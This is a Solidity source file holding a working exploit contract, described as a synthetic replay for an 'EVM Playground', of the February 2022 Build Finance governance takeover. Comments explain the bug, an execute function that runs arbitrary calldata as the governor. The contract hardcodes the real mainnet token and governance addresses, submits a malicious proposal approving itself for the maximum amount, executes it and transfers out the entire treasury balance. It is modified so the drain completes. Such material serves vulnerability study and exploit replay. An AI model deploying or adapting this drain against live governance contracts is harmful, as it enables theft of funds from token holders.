// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-02-BuildF).
//
// The DeFiHackLabs PoC (test/BuildF_exp.sol) runs the attack INLINE in the
// Foundry ContractTest: it `vm.prank`s a BUILD whale to seed the attacker,
// proposes a malicious governance proposal whose body is
//   BUILD.approve(<hardcoded 0xb4c79daB…>, max),
// enlists a second whale to vote past quorum, `vm.warp`s past the execution
// window, executes, then transferFroms the treasury. That test REVERTS at the
// final transferFrom because the calldata hardcodes a spender (a forge default
// address) that is NOT the test's actual caller.
//
// This contract is a faithful, self-contained copy of the SAME governance-
// takeover attack (the bug class is identical — the governor's `execute` runs
// ARBITRARY calldata as the governor itself, so a proposal can self-approve
// the governor's treasury balance to an attacker). The only difference vs. the
// test is that the approved spender is THIS contract, so the takeover actually
// completes and the treasury drains — exactly what happened on mainnet Feb 2022.
//
// All on-chain constants are copied verbatim from the writeup / Governance.sol.
//
// Root cause: Governance.execute does `_target.call{value}(_data)` with NO
// target whitelist and NO calldata review, so `msg.sender` of the inner call is
// the Governance contract itself. A proposal with target = BUILD token and
// data = approve(attacker, max) makes the governor approve the attacker as a
// spender of its own custodied BUILD balance — built up by `lockVotes`, which
// never auto-returns voter tokens. One transferFrom later, the treasury is gone.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IGovernance {
    function propose(address target, uint256 value, bytes memory data) external returns (uint256);
    function execute(uint256 proposalId, address target, uint256 value, bytes memory data)
        external
        payable
        returns (bytes memory);
}

contract BuildFDrain {
    // --- on-chain constants (verbatim from the writeup) ---
    address constant BUILD = 0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739;
    address constant GOVERNANCE = 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583;

    // The proposal id assigned by `propose` (proposalCount 7 → 8).
    uint256 constant PROPOSAL_ID = 8;

    IERC20 constant build = IERC20(BUILD);

    // The malicious proposal body: BUILD.approve(address(this), max). Built here
    // (not in setup) so the same bytes are used for BOTH propose and execute —
    // Governance requires proposal.txHash == keccak256(target, value, data).
    function _approveData() internal view returns (bytes memory) {
        return abi.encodeWithSelector(IERC20.approve.selector, address(this), type(uint256).max);
    }

    // Called (unrecorded) from setup after the attacker has been dealt the seed.
    // approve(Governance) so lockVotes can pull the seed, then propose the
    // self-approve-the-treasury proposal. Governance.propose is `lockVotes`-
    // guarded, so it transferFroms the attacker's whole seed into Governance
    // (making it the proposal's locked voting weight) and proposalCount 7 → 8.
    function prepare() external {
        build.approve(GOVERNANCE, type(uint256).max);
        IGovernance(GOVERNANCE).propose(BUILD, 0, _approveData());
    }

    // The recorded entrypoint. By the time this runs, `setup` has: seeded the
    // attacker + proposed (above), dealt a cooperating voter + cast vote(8, true)
    // past quorum, and backdated proposal 8's startTime so state() == ReadyForExecution.
    // This call runs the attacker's proposal body AS the governor (so Governance
    // approves THIS contract for max BUILD), then pulls the treasury to itself.
    function run() external {
        // 1. Execute the malicious proposal. Governance does BUILD.approve(this, max)
        //    with msg.sender = Governance (the bug).
        IGovernance(GOVERNANCE).execute(PROPOSAL_ID, BUILD, 0, _approveData());

        // 2. Drain the governor's entire custodied BUILD balance to this contract.
        uint256 loot = build.balanceOf(GOVERNANCE);
        build.transferFrom(GOVERNANCE, address(this), loot);
    }
}
